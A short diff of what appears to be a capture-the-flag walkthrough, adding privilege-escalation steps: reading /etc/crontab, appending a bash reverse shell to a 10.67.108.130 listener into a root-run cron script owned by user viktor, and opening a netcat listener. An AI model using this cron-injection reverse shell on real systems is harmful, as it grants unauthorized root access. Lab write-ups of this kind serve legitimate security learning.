@@ -679,7 +679,17 @@ su into viktor user using viktor's flag as password
 
 `:> ls -alh .gnupg/private-keys-v1.d` : Nothing useful  
 
+Refer to privilege escalation file  
 
+`:> cat /etc/crontab`  
+
+Find some information  
+
+The file indicated is owned by viktor...  but executed with root privilege.
+
+echo "bash -i >& /dev/tcp/10.67.108.130/5555 0>&1" >> /opt/scripts/47.sh
+
+`:> nc -lvnp 5555` : open listener
 
 
 
